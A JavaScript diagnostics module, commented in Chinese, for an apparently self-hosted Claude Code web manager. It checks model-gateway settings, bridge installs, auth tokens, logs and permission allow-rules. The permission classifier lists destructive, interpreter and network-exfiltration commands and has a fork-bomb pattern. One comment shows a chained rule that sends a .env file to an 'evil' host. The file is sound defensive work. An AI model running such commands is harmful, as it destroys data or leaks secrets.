// 模型配置「永不打架」体检：settings 的 model 字段 vs 各工作目录的 ANTHROPIC_DEFAULT_*_MODEL 网关映射。
//
// 判据来自实测（2026-08-04，CLI 2.1.221，本地假网关抓 /v1/messages 请求体）：
//   全局 sonnet + 目录映射 SONNET  → 发出 grok-4.5       （映射生效）
//   全局 sonnet + 目录只映射 OPUS  → 发出 claude-sonnet-5（该档位无映射 ⇒ 退回官方全名，网关不认）
//   全局 claude-opus-5 + 全套映射  → 发出 claude-opus-5  （全名不走档位表 ⇒ 绕过映射）
//   全局不设 model + 全套映射      → 发出 glm-5.2        （CLI 自选档位，映射生效）
// ⇒ 决定映射是否命中的是「model 解析出的**档位**是否在**该目录**被映射」。
//    旧实现比对的是「model 字符串是否等于/前缀匹配某个映射目标」，把最常见且完全正确的
//    `model: "sonnet"` 判成冲突（别名恰恰是映射生效的前提），且把所有工作目录的映射目标混成
//    一个扁平数组比对——多网关并存时归属随机，给出的修复建议会把无网关的项目钉死到别人的模型名。
//
// 入参 dirs：[{ dir, localModel, projectModel, tierTargets:{ sonnet:'grok-4.5', ... } }]，
// 由 doctor-runtime 读盘后按目录组装（只抽必要字段，不回显 token）。

// 单档位别名。opusplan 走「计划用 opus、执行用 sonnet」，两档都得映射才算命中。
const TIER_ALIASES = { sonnet: ['sonnet'], opus: ['opus'], haiku: ['haiku'], fable: ['fable'], opusplan: ['opus', 'sonnet'] };
// 未 pin model 时 CLI 自选档位，事先无法预知选哪档 —— 要求主档位齐全才算安全，
// 这样判据不依赖「当前版本默认走 opus」这个会随版本变的事实。fable 不列入：属新增档位，
// 9 个真实网关目录里仅 2 个映射了它，要求齐全会把正常配置整片判红。
const MAIN_TIERS = ['sonnet', 'opus', 'haiku'];
const stripCtxSuffix = (s) => String(s || '').trim().replace(/\[[^\]]+\]$/, '');

// model 字符串 → 需要命中的档位集合。knownTiers 让配置里出现的新档位（如将来的 ANTHROPIC_DEFAULT_XXX_MODEL）
// 自动被认作别名，无需改这张表。返回 null = 全名（不走档位表）。
function resolveTiers(model, knownTiers) {
  const bare = stripCtxSuffix(model).toLowerCase();
  if (!bare || bare === 'default') return MAIN_TIERS;
  // 必须 hasOwn：裸 `TIER_ALIASES[bare]` 对 'constructor' / '__proto__' 会经原型链返回真值非数组，
  // 下游 tiers.filter 抛 TypeError 冲出 runDoctor，整份体检报告挂掉而不是降级成一行 warn。
  if (Object.hasOwn(TIER_ALIASES, bare)) return TIER_ALIASES[bare];
  if (knownTiers.has(bare)) return [bare];
  return null;
}

// 单目录判定。effectiveModel 按 CLI 的 settings 优先级 local > project > user 取。
function diagnoseDir({ dir, localModel, projectModel, tierTargets }, userModel) {
  const targets = tierTargets && typeof tierTargets === 'object' ? tierTargets : {};
  const mapped = new Set(Object.entries(targets).filter(([, v]) => String(v || '').trim()).map(([k]) => k.toLowerCase()));
  const name = String(dir || '').split(/[\\/]/).filter(Boolean).pop() || String(dir || '');
  if (!mapped.size) return null;                       // 该目录没配网关映射 → 全名/别名都合法
  const effective = String(localModel || '').trim() || String(projectModel || '').trim() || String(userModel || '').trim();
  const pinnedHere = !!(String(localModel || '').trim() || String(projectModel || '').trim());
  const tiers = resolveTiers(effective, mapped);
  if (tiers === null) {
    // 全名：目录内已显式 pin（含直接 pin 成网关模型名）视为有意为之，覆盖链清晰不告警；
    // 只有「目录自己没 pin、被外层全名默认值罩住」才是会真失败的那种配置。
    if (pinnedHere) return null;
    return { name, reason: `全局 model=${effective} 是模型全名，不走档位映射表，会原样发给网关` };
  }
  const missing = tiers.filter(t => !mapped.has(t));
  if (!missing.length) return null;
  return { name, reason: `档位 ${missing.join('/')} 在此目录无 ANTHROPIC_DEFAULT_*_MODEL 映射，会退回官方全名` };
}

export function modelSettingsConflictDiagnostic({ userModel = '', dirs = [] } = {}) {
  const list = Array.isArray(dirs) ? dirs : [];
  const withGateway = list.filter(d => {
    const t = d?.tierTargets;
    return t && typeof t === 'object' && Object.values(t).some(v => String(v || '').trim());
  });
  if (!withGateway.length) {
    return { status: 'ok', name: 'MODEL_SETTINGS', detail: '未检测到 ANTHROPIC_DEFAULT_* 网关映射，无 model 冲突信号' };
  }
  const problems = list.map(d => diagnoseDir(d, userModel)).filter(Boolean);
  if (!problems.length) {
    const u = String(userModel || '').trim();
    return {
      status: 'ok',
      name: 'MODEL_SETTINGS',
      detail: `${withGateway.length} 个目录配了网关映射，档位解析均命中（全局 model=${u || '未设，CLI 自选'}）`,
    };
  }
  const shown = problems.slice(0, 3).map(p => `${p.name}（${p.reason}）`).join('；');
  const more = problems.length > 3 ? `；等 ${problems.length} 个目录` : '';
  return {
    status: 'warn',
    name: 'MODEL_SETTINGS',
    detail: `${shown}${more}。修法：在该目录的 .claude/settings.local.json 补上缺失档位的 ANTHROPIC_DEFAULT_*_MODEL，或写 "model" 为已映射的档位别名（sonnet/opus/haiku）。`,
  };
}

// off：调用方传入的 `process.env.WEB_STATUSLINE === 'off'`（本模块不直接读 env，保持纯函数可测）。
// 两态都是合法配置、非风险，status 恒 ok；detail 如实反映当前生效状态，不再是恒定文案。
export function statuslineConfigDiagnostic(off = false) {
  return {
    status: 'ok',
    name: 'WEB_STATUSLINE',
    detail: off
      ? '已通过 WEB_STATUSLINE=off 关闭 web 状态栏。'
      : 'web 状态栏自包含：使用 SDK usage + 本机 git + CLI 版本，默认启用；设 WEB_STATUSLINE=off 可关闭。',
  };
}

export function statuslineBridgeDiagnostic({ webOff = false, bridgeOff = false, installState = 'not-installed' } = {}) {
  if (webOff) {
    return { status: 'ok', name: 'CLI_STATUSLINE_BRIDGE', detail: 'WEB_STATUSLINE=off，CLI bridge 不参与运行。' };
  }
  if (bridgeOff) {
    return { status: 'ok', name: 'CLI_STATUSLINE_BRIDGE', detail: '已通过 CLI_STATUSLINE_BRIDGE=off 回滚为 SDK-only 状态栏。' };
  }
  if (installState === 'installed') {
    return { status: 'ok', name: 'CLI_STATUSLINE_BRIDGE', detail: '已安装：CLI 驾驶时按 session 同步 statusline；Web 驾驶时使用 SDK。' };
  }
  if (installState === 'drifted') {
    return { status: 'warn', name: 'CLI_STATUSLINE_BRIDGE', detail: '安装记录与当前 Claude statusLine.command 已漂移/被改写；先运行 `npm run statusline:status` 检查，勿强行覆盖。' };
  }
  return { status: 'warn', name: 'CLI_STATUSLINE_BRIDGE', detail: '未安装；Web 驾驶的 SDK 状态栏可用，但 CLI 镜像 statusline 不同步。运行 `npm run statusline:install` 显式启用。' };
}

// D12: CLI hooks 桥安装态（同 D6：只消费 status 子命令的 state，不回显任何命令内容）。
export function hooksBridgeDiagnostic({ bridgeOff = false, installState = 'not-installed' } = {}) {
  if (bridgeOff) {
    return { status: 'ok', name: 'CLI_HOOKS_BRIDGE', detail: '已通过 CLI_HOOKS_BRIDGE=off 停用（安装保留，事件不消费）。' };
  }
  if (installState === 'installed') {
    return { status: 'ok', name: 'CLI_HOOKS_BRIDGE', detail: '已安装：终端会话回合结束/需要你时即时刷新并推送。' };
  }
  if (installState === 'drifted') {
    return { status: 'warn', name: 'CLI_HOOKS_BRIDGE', detail: '安装记录与 settings.json 的 hooks 条目已漂移；先运行 `npm run hooks:status` 检查，勿强行覆盖。' };
  }
  return { status: 'warn', name: 'CLI_HOOKS_BRIDGE', detail: '未安装；终端直跑的会话仅靠 2.5s 轮询、无推送。运行 `npm run hooks:install` 显式启用。' };
}

// 命令名右边界：空白、冒号、行尾。冒号是关键——Claude Code 的规范通配语法是 `Bash(rm:*)`，
// 此前 `rm(\s|$)` / `dd\s` 只认空白和行尾，把最常见的写法整类漏成 warn（而同一条正则里
// sudo/chmod/curl 因为是纯前缀匹配反而判对了，规则内部不自洽）。
const CMD_BOUNDARY = '(?=[\\s:*]|$)';
const DESTRUCTIVE_CMDS = 'sudo|doas|su|rm|rmdir|chmod|chown|chgrp|mkfs|dd|shutdown|reboot|halt|kill|pkill|killall';
// 解释器：语义上与 Bash(*) 完全等价（都能执行任意命令），而 Bash(*) 是 danger。
// 有意不含 npm/npx/node/python —— 它们有大量正当窄用法（如既有的 Bash(npm run test:*) → ok）。
const INTERPRETER_CMDS = 'sh|bash|zsh|ksh|fish|dash|eval|exec|source';
const EXFIL_CMDS = 'curl|wget|nc|ncat|ssh|scp|sftp|telnet|rsync';

function classifyBashSegment(seg) {
  if (/^:\(\)\s*\{/.test(seg)) return { severity: 'danger', reason: 'fork 炸弹' };
  if (new RegExp(`^(${DESTRUCTIVE_CMDS})${CMD_BOUNDARY}`).test(seg)) return { severity: 'danger', reason: '破坏性 / 提权命令' };
  if (new RegExp(`^(${INTERPRETER_CMDS})${CMD_BOUNDARY}`).test(seg)) return { severity: 'danger', reason: '解释器可执行任意命令（等同放开 shell）' };
  if (new RegExp(`^(${EXFIL_CMDS})${CMD_BOUNDARY}`).test(seg)) return { severity: 'danger', reason: '可外联 / 数据外泄' };
  if (/^\S+\*/.test(seg)) return { severity: 'warn', reason: '通配命令族，注意范围' }; // 命令名直接跟*=宽
  return null;
}

// ④ 安全体检核心：危险白名单判定。解析 permissions.allow 里的 `Tool(specifier)` 规则，判其宽严。
//   danger = 公网暴露前必须收紧；warn = 偏宽需留意；ok = 有界。识别不了的一律不误报 danger。
export function classifyPermissionRule(rule) {
  const r = String(rule ?? '').trim();
  const m = r.match(/^([A-Za-z_][\w]*)(?:\(([\s\S]*)\))?$/);
  if (!m) return { rule: r, severity: 'ok', reason: '无法解析，按低风险处理' };
  const tool = m[1];
  const spec = m[2] === undefined ? null : m[2].trim();
  const wildcard = spec === null || spec === '' || spec === '*' || spec === ':*';

  if (tool === 'Bash') {
    if (wildcard) return { rule: r, severity: 'danger', reason: '任意命令放行（等于放开 shell）' };
    const s = spec.toLowerCase();
    // 逐段判定：只看第一个 token 会把 `npm run build && curl http://evil/$(cat .env)` 判成「限定命令」。
    // 按 shell 的命令分隔符/替换符切开，任一段危险则整条危险（取最严）。
    const segments = s.split(/&&|\|\||[;|&`]|\$\(/).map(x => x.trim()).filter(Boolean);
    let worst = null;
    for (const seg of segments) {
      const hit = classifyBashSegment(seg);
      if (hit?.severity === 'danger') return { rule: r, severity: 'danger', reason: hit.reason };
      if (hit?.severity === 'warn' && !worst) worst = hit;
    }
    if (worst) return { rule: r, severity: 'warn', reason: worst.reason };
    return { rule: r, severity: 'ok', reason: '限定命令' };
  }
  // 宽路径通配（** / ~/** / /** / ../** …）：读与写共用——此前 Write 只认 null/''/'*' /':*' 为
  // wildcard，Write(**) 被当成「限定路径的写」→ ok，doctor readiness 假绿（OPS-1）。
  const broadPathGlob = /^(\.\.\/)*~?\/?\*\*/.test(spec);
  if (tool === 'Write' || tool === 'Edit' || tool === 'MultiEdit' || tool === 'NotebookEdit') {
    if (wildcard || broadPathGlob) return { rule: r, severity: 'danger', reason: '可写任意文件（无路径限定）' };
    return { rule: r, severity: 'ok', reason: '限定路径的写' };
  }
  if (tool === 'Read') {
    // (\.\.\/)* 兜住相对父目录穿越（如 ../** / ../../**）——之前只认 ~/、/、裸 ** 开头，会漏判这类同样宽泛的通配。
    if (wildcard || broadPathGlob) return { rule: r, severity: 'warn', reason: '可读大范围文件' };
    return { rule: r, severity: 'ok', reason: '限定路径的读' };
  }
  if (tool === 'WebFetch' || tool === 'WebSearch') return { rule: r, severity: 'warn', reason: '可访问外部网络' };
  return { rule: r, severity: 'ok', reason: '常规工具' };
}

// 汇总白名单：ruleCount 全量 + dangerous 仅危险条（scope / 源文件由 doctor-runtime 附加，让用户知道改哪个文件）。
export function summarizeDangerous(rules = []) {
  const list = rules || [];
  const dangerous = list.map(classifyPermissionRule).filter(c => c.severity === 'danger');
  return { ruleCount: list.length, dangerous };
}

// AUTH_TOKEN 判定：绝不回显明文，只出 isSet + length。空 = fail（未保护）；<8 = warn（弱）；否则 ok。
export function classifyAuthToken(token) {
  if (token === undefined || token === null) return { status: 'warn', isSet: false };
  const t = String(token);
  if (t === '') return { status: 'fail', isSet: false };
  if (t.length < 8) return { status: 'warn', isSet: true, length: t.length };
  return { status: 'ok', isSet: true, length: t.length };
}

// AUTH-003：localhost / 反代到 127.0.0.1 的隧道会跳过设备指纹审批（trustBasis=bypass），
// 公网只剩 AUTH_TOKEN 一层。CF Access 已开则 JWT 是公网门，不警告。
// 返回 { status, detail, safe } 供 runDoctor 挂 checks。
export function classifyDeviceGateTopology({ authTokenSet, cfEnabled } = {}) {
  if (cfEnabled) {
    return {
      status: 'ok',
      detail: '公网经 CF Access 2FA；本机/Access 跳过设备门为设计路径',
      safe: { risk: 'none', cfEnabled: true },
    };
  }
  if (authTokenSet) {
    // 与 shouldBypassDeviceApproval 对齐（A2）：peer loopback 且 Host 为公网域名时**不会** bypass 设备门；
    // 仅「真本机直连」(Host 本机样) 或 CF Access 已验才跳过。旧文案夸大了隧道跳过风险。
    return {
      status: 'ok',
      detail: 'AUTH_TOKEN 已设；设备门对公网 Host（含 tunnel 反代到 127.0.0.1）仍生效，仅本机直连或 CF Access 跳过。未开 CF Access 时公网仍建议加 2FA 加深防护',
      safe: { risk: 'none', cfEnabled: false, authTokenSet: true, note: 'host_aware_device_gate' },
    };
  }
  return {
    status: 'ok',
    detail: '未设 AUTH_TOKEN（仅绑 127.0.0.1），无公网设备门问题',
    safe: { risk: 'none', authTokenSet: false },
  };
}

// 公网暴露就绪度聚合。blocked = 有 fail，或（危险白名单 + 无 CF Access 兜底 + token 弱）；
// caution = 有危险白名单 / 任一 warn；ready = 关键项皆净。
export function computeReadiness(checks = []) {
  const list = checks || [];
  const byId = Object.fromEntries(list.map(c => [c.id, c]));
  const anyFail = list.some(c => c.status === 'fail');
  const dangerous = byId.WHITELIST?.safe?.dangerous;
  const hasDanger = Array.isArray(dangerous) && dangerous.length > 0;
  const cfEnabled = byId.CF_ACCESS?.safe?.enabled === true;
  const tokenWeak = byId.AUTH_TOKEN?.status !== 'ok';
  if (anyFail || (hasDanger && !cfEnabled && tokenWeak)) return { level: 'blocked', summary: '公网暴露前需修复高风险项' };
  if (hasDanger || list.some(c => c.status === 'warn')) return { level: 'caution', summary: '可用，但有需留意的偏宽项' };
  return { level: 'ready', summary: '关键项就绪' };
}

// 日志开关长开检出。三个开关都会放大日志体积，但量级差几个数量级：
// DEBUG_SDK_MESSAGES 每条 SDK 消息一行（2026-07-18 归档实测 149MiB，见 app.js:2661 注释），
// LOG_STDERR 只在子进程写 stderr 时出，LOG_INTERACTIONS 每条消息四行。
//
// 判据与服务状态面板对齐（logic.js serviceStatusBasicRows：只有 sdkDebug 算 alert）——
// interactions/stderr 单开是正常调试态，恒 warn 会变成人人忽略的噪音（同 metrics.js
// recentDeliveryFailure「狼来了」考虑）。但它们叠加「日志已涨过轮转阈值」时要提醒：
// rotate-logs.sh 是 --max-mb 20 --keep 5，越过阈值就开始天天轮转，保留窗口随之压缩。
//
// 阈值取 rotate-logs.sh 的 MAX_MB=20，不是拍脑袋：越过它才真正开始吃保留窗口。
// 两处各写各的有漂移风险，但 shell 脚本无法被 import——改 rotate-logs.sh 时须同步此处。
export const LOG_ROTATE_THRESHOLD_BYTES = 20 * 1024 * 1024;

// R9-uploads（2026-08-06）：附件目录只报可见性，【刻意不自动清理】。
// .ccm-uploads/ 落在机主真实工作目录里，且历史消息回显要读它（附件预览走 browse:read）——按 TTL 或
// 容量删会让老对话的图片预览全坏掉。要做对只有「识别 transcript 已引用不到的孤儿」一条路，那要扫全部
// transcript 做引用计数，复杂度与风险都不匹配实测增长率（22 天 2.5MB）。对比 statusline 快照：那边过期
// 即无用（读出来必是 stale），所以那边治、这边不治。同样的「只写不清」症状，处置完全相反。
// 阈值 200MB：远高于正常使用量级，越过它才值得机主分神去看一眼。
export const UPLOADS_FOOTPRINT_WARN_BYTES = 200 * 1024 * 1024;

const mb = bytes => Math.round(bytes / 1024 / 1024);

// dirs: [{ cwd, bytes, files }]，由调用方扫盘得到（本函数纯判定、不读盘）。
export function uploadsFootprintDiagnostic({ dirs = [] } = {}) {
  const list = (Array.isArray(dirs) ? dirs : []).filter(d => d && Number(d.bytes) > 0);
  if (!list.length) return { status: 'ok', detail: '无附件占用（.ccm-uploads 为空或不存在）' };

  const totalBytes = list.reduce((sum, d) => sum + Number(d.bytes || 0), 0);
  const totalFiles = list.reduce((sum, d) => sum + Number(d.files || 0), 0);
  const biggest = list.reduce((max, d) => (Number(d.bytes) > Number(max.bytes) ? d : max), list[0]);
  const base = `手机上传的附件共 ${mb(totalBytes)} MB / ${totalFiles} 个文件（最大：${biggest.cwd}）`;

  if (totalBytes <= UPLOADS_FOOTPRINT_WARN_BYTES) {
    return { status: 'ok', detail: base };
  }
  return {
    status: 'warn',
    detail: `${base}\n` +
      `  产品【不会自动清理】它：历史消息里的附件预览要读这些文件，按时间或容量删会让老对话的图片打不开。\n` +
      `  需要回收空间时手动删（删掉的那几条历史里预览会失效，对话正文不受影响）。`,
  };
}

export function logSwitchDiagnostic({ interactions = false, sdkDebug = false, stderr = false, logFileBytes = 0 } = {}) {
  const on = [];
  if (sdkDebug) on.push('DEBUG_SDK_MESSAGES');
  if (interactions) on.push('LOG_INTERACTIONS');
  if (stderr) on.push('LOG_STDERR');
  if (!on.length) return { status: 'ok', detail: '三个日志开关均关闭' };

  const bytes = Number.isFinite(logFileBytes) && logFileBytes > 0 ? logFileBytes : 0;
  const oversized = bytes >= LOG_ROTATE_THRESHOLD_BYTES;
  const sizeNote = oversized ? `；日志已 ${Math.round(bytes / 1024 / 1024)} MB（超轮转阈值，保留窗口正在缩短）` : '';
  const list = on.join(' / ');

  if (sdkDebug) {
    return {
      status: 'warn',
      detail: `${list} 开着${sizeNote}\n` +
        `  DEBUG_SDK_MESSAGES 每条 SDK 消息一行，长开曾把日志刷到 149MB（2026-07-18 归档实测）。\n` +
        `  调试完请在 .env 关掉并重启常驻 server。`,
    };
  }
  if (oversized) {
    return { status: 'warn', detail: `${list} 开着${sizeNote}\n  确认仍需要，否则关掉以免继续压缩日志保留窗口。` };
  }
  return { status: 'ok', detail: `${list} 开着（量级可控，日志未超轮转阈值）` };
}

// CLAUDE_CONFIG_DIR 兼容性告警（只报不修）。
//
// CLI 与 Agent SDK 都认这个 env——SDK 实测 projects 根 = `(CLAUDE_CONFIG_DIR ?? ~/.claude)/projects`
// （sdk.mjs 里以该 env 为 memoize cache key，运行时改即生效）。而本仓 history.js 的 CLAUDE_DIR
// 固定 `homedir()/.claude/projects`：设了这个变量，CLI 把 transcript 落到新位置，本仓仍去老地方找。
//
// 之所以必须告警：失败形态是**静默**的——读不到文件等于「这个工作区没有会话」，不报错、不留痕，
// 用户只会看到会话列表空白，无从自查。同型于 project 目录名编码漂移那次（stat 失败被 catch 吞成没有会话）。
//
// 【为什么只告警不支持】改根目录解析牵动所有路径计算，含删除护栏那条路径（2026-08-02 删库事故就出在
// 目录段被算错上）。n=1 自托管默认不设这个变量，为一个当前无人使用的部署形态改动删除路径，风险大于收益。
// 真要支持，得连同 workdirs / 镜像 / 删除护栏一起改，值得单独立项。
export function claudeConfigDirDiagnostic({ configDir = '' } = {}) {
  const dir = typeof configDir === 'string' ? configDir.trim() : '';
  if (!dir) return { status: 'ok', detail: '未设置（CLI 与本仓都走默认 ~/.claude）' };
  return {
    status: 'warn',
    detail: `CLAUDE_CONFIG_DIR=${dir}\n`
      + `  CLI 会把会话 transcript 落到该目录下，而本仓固定读 ~/.claude/projects —— 会话历史与只读镜像\n`
      + `  会读不到，且表现为「这个工作区没有会话」而不是报错。请取消该变量，或改用终端查看这些会话。`,
  };
}
